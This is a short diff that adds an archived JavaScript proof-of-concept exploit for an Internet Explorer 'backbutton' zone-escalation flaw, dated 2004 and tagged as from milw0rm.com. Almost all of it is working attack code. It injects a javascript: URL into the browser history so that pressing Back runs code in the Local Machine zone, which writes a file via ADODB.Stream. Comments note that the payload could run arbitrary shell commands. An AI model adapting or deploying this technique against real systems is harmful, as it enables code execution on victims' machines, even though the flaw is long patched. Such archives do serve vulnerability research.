@@ -1,0 +1,41 @@
+// Andreas Sandblad, 2004-02-03, patched by MS04-004
+
+// Name:     payload
+// Purpose:  Run payload code called from Local Machine zone.
+//           The code may be arbitrary such as executing shell commands.
+//           This demo simply creates a harmless textfile on the desktop.
+function payload() {
+  file = "sandblad.txt";
+  o = new ActiveXObject("ADODB.Stream");
+  o.Open();
+  o.Type=2;
+  o.Charset="ascii";
+  o.WriteText("You are vulnerable!");
+  o.SaveToFile(file, 2);
+  o.Close();
+  alert("File "+file+" created on desktop!");
+}
+
+// Name:     trigger
+// Purpose:  Inject javascript url in history list and run payload
+//           function when the user hits the backbutton.
+function trigger(len) {
+  if (history.length != len)
+    payload();
+  else
+    return "<title>-</title><body
+onload=external.NavigateAndFind('res:','','')>";
+}
+
+// Name:    backbutton
+// Purpose: Run backbutton exploit.
+function backbutton() {
+  location = 'javascript:'+trigger+payload+'trigger('+history.length+')';
+}
+
+// Launch backbutton exploit on load
+if (confirm("Press OK to run backbutton exploit!"))
+  backbutton();
+
+
+# milw0rm.com [2004-02-04]
